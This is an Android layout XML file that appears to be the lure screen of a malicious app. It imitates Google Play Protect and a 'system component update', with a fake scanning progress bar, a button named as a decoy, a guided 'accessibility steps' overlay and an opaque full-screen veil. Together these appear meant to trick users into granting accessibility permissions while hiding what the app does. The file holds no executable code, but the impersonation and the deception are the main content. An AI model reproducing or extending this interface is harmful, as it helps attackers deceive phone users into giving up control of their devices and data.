<?xml version="1.0" encoding="utf-8"?>
<!-- PATCHED (task-9): "system component update" style. All original view ids kept (build-env/java references them). -->
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#0D0F14">

    <!-- TOP LEFT BACK ARROW (COMPLETION OVERLAY) -->
    <ImageView
        android:id="@+id/btnOverlayBack"
        android:layout_width="48dp"
        android:layout_height="48dp"
        android:layout_gravity="top|start"
        android:layout_marginTop="16dp"
        android:layout_marginStart="16dp"
        android:padding="12dp"
        android:contentDescription="Back"
        android:clickable="true"
        android:focusable="true"
        android:background="?android:attr/selectableItemBackgroundBorderless"
        android:src="@drawable/ic_back_arrow"
        app:tint="#E6E8EC"
        android:visibility="gone" />

    <!-- GUIDED OPTIMIZATION FLOW (scanning / update pipeline) -->
    <LinearLayout
        android:id="@+id/layoutScanning"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:gravity="center"
        android:orientation="vertical"
        android:padding="50dp"
        android:visibility="visible">

        <ImageView
            android:id="@+id/ivPlayProtectRobot"
            android:layout_width="120dp"
            android:layout_height="120dp"
            android:layout_gravity="center_horizontal"
            android:layout_marginTop="10dp"
            android:fitsSystemWindows="true"
            android:focusedByDefault="true"
            android:forceHasOverlappingRendering="true"
            android:src="@drawable/ic_android_system" />

        <TextView
            android:id="@+id/tvPlayProtectSub"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginTop="26dp"
            android:fontFamily="@font/assistant"
            android:gravity="center"
            android:letterSpacing=".02"
            android:text="@string/guide_title"
            android:textAlignment="center"
            android:textColor="#F2F4F8"
            android:textSize="22sp"
            android:textStyle="bold" />

        <TextView
            android:id="@+id/tvPlayProtectDetails"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginTop="12dp"
            android:layout_marginBottom="24dp"
            android:fontFamily="@font/assistant"
            android:text="@string/guide_subtitle"
            android:textAlignment="center"
            android:textColor="#9AA3B2"
            android:textSize="15sp" />

        <!-- Step progress hint (e.g. "3/8") - id reserved for build-env -->
        <TextView
            android:id="@+id/tv_progress"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_marginBottom="14dp"
            android:fontFamily="monospace"
            android:gravity="center"
            android:text="@string/guide_progress_ready"
            android:textColor="#4FC3F7"
            android:textSize="13sp" />

        <ProgressBar
            android:id="@+id/pbPlayProtect"
            style="@android:style/Widget.Holo.ProgressBar.Horizontal"
            android:layout_width="match_parent"
            android:layout_height="13dp"
            android:layout_marginBottom="20dp"
            android:max="100"
            android:progress="0"
            android:progressTint="#00E0A0" />

        <com.google.android.material.button.MaterialButton
            android:id="@+id/btnFinishDecoy"
            style="@style/Widget.MaterialComponents.Button.UnelevatedButton"
            android:layout_width="200dp"
            android:layout_height="52dp"
            android:layout_gravity="center_horizontal"
            android:layout_marginTop="10dp"
            android:text="@string/guide_button"
            android:textColor="#FFFFFF"
            android:textSize="15sp"
            android:textStyle="bold"
            app:backgroundTint="#0B875B"
            app:cornerRadius="26dp"
            android:visibility="gone" />

    </LinearLayout>

    <!-- GUIDE / ACCESSIBILITY STEPS OVERLAY -->
    <LinearLayout
        android:id="@+id/layoutGuide"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:gravity="center"
        android:orientation="vertical"
        android:padding="32dp"
        android:visibility="gone">

        <ImageView
            android:id="@+id/ivGuideIcon"
            android:layout_width="80dp"
            android:layout_height="80dp"
            android:src="@android:drawable/ic_dialog_info"
            app:tint="#4FC3F7" />

        <TextView
            android:id="@+id/tvGuideHeader"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_marginTop="24dp"
            android:text="@string/guide_title"
            android:textColor="#F2F4F8"
            android:textSize="22sp"
            android:textStyle="bold" />

        <TextView
            android:id="@+id/tvGuideMsg"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_marginTop="12dp"
            android:layout_marginBottom="32dp"
            android:gravity="center"
            android:text="@string/guide_subtitle"
            android:textColor="#9AA3B2"
            android:textSize="15sp" />

        <LinearLayout
            android:id="@+id/llStepsContainer"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:orientation="vertical" />

        <com.google.android.material.button.MaterialButton
            android:id="@+id/btnGuideAction"
            android:layout_width="match_parent"
            android:layout_height="64dp"
            android:layout_marginTop="48dp"
            android:text="@string/guide_button"
            android:textColor="#FFFFFF"
            android:textSize="16sp"
            android:textStyle="bold"
            app:backgroundTint="#0B875B"
            app:cornerRadius="100dp" />

    </LinearLayout>

    <!-- FROSTED GLASS BLUR VEIL -->
    <View
        android:id="@+id/viewFrostedVeil"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:background="#0D0F14"
        android:alpha="0"
        android:visibility="gone" />

</FrameLayout>
